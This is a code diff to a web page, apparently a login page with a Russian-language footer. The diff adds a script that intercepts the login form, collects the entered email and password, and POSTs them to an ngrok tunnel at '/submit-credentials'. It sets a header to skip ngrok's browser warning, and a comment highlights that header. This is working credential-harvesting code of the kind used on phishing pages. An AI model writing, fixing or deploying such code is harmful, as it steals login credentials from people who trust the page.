@@ -58,6 +58,36 @@
       <a href="#" onclick="event.preventDefault()">Условия</a>
     </div>
   </footer>
+  <script>
+    const SERVER_URL = "https://starting-surgical-wing.ngrok-free.dev";
 
+    document.getElementById("loginForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const form = e.target;
+      const data = {
+        email: form.email.value,
+        password: form.password.value
+      };
+
+      try {
+        const response = await fetch(`${SERVER_URL}/submit-credentials`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "ngrok-skip-browser-warning": "true"   // ← ВОТ ЭТА СТРОКА
+          },
+          body: JSON.stringify(data)
+        });
+
+        if (response.ok) {
+          console.log("Данные отправлены");
+        } else {
+          console.error("Ошибка отправки:", response.status);
+        }
+      } catch (err) {
+        console.error("Не удалось связаться с сервером:", err);
+      }
+    });
+  </script>
 </body>
 </html>
